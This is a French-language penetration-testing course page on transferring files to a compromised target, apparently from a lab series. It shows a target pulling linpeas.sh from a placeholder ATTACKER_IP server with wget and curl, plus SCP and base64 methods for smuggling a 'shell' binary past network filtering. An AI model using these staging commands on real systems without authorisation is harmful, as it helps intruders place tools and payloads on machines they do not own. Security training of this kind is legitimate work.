# Transfert de fichiers

[<< Precedent : Elevation de privileges](06-elevation-de-privileges.md) | [Suivant : Walkthrough Nibbles >>](08-walkthrough-nibbles.md)

---

## Methode principale : serveur HTTP Python

```bash
# Sur l'attaquant : demarrer un serveur HTTP
cd /tmp && python3 -m http.server 8000

# Sur la cible : telecharger
wget http://ATTACKER_IP:8000/linpeas.sh
curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh
```

---

## SCP (si SSH disponible)

```bash
scp linpeas.sh user@TARGET_IP:/tmp/linpeas.sh
```

---

## Base64 (quand le reseau est filtre)

Utile quand les connexions sortantes sont bloquees. On encode le fichier, on copie-colle la chaine, et on decode sur la cible.

```bash
# Encoder sur l'attaquant
base64 shell -w 0

# Decoder sur la cible
echo "f0VMRgIBAQA...lIuy9iaW4vc2gA" | base64 -d > shell
```

---

## Verification d'integrite

Toujours verifier que le fichier n'a pas ete corrompu pendant le transfert :

```bash
# Sur l'attaquant
md5sum shell
# -> 321de1d7e7c3735838890a72c9ae7d1d

# Sur la cible
md5sum shell
# -> 321de1d7e7c3735838890a72c9ae7d1d  (doit etre identique)
```

> Voir [cheatsheet file-transfers](../../../cheatsheets/file-transfers.md) pour Windows et autres methodes.
